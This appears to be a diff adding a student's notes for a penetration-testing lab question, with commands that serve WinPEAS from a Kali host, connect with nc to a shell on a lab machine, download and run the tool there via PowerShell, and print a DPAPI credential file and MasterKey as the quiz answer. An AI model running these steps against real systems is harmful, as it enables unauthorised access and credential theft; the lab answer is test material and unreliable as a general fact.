@@ -1,0 +1,22 @@
+Questions 1
+Follow the steps from this section and examine the output headlined Checking for DPAPI Credential Files. Enter one of the MasterKeys as answer.
+HINT
+Begin by running WinPEAS on the VM #1. Look for the 'Checking for DPAPI Credential Files' section and then masterkeys in the output.
+Alternatively, you can also redirect the output to a text file using the > operator and search the masterkeys.
+
+sudo apt-get install peass
+cp /usr/share/peass/winpeas/winPEASx64.exe /home/kali/Desktop/ 
+chmod 777 winPEASx64.exe
+python3 -m http.server 80
+
+nc 192.168.192.220 4444
+C:\Users\dave>powershell
+PS C:\Users\dave> iwr -uri http://192.168.45.178/winPEASx64.exe -Outfile winPEAS.exe
+
+PS C:\Users\dave> .\winPEAS.exe
+����������͹ Checking for DPAPI Credential Files
+CredFile: C:\Users\dave\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+Description: Local Credential Data
+MasterKey: 7ba528f7-4e73-48a3-8a67-e5680688c9ff
+
+
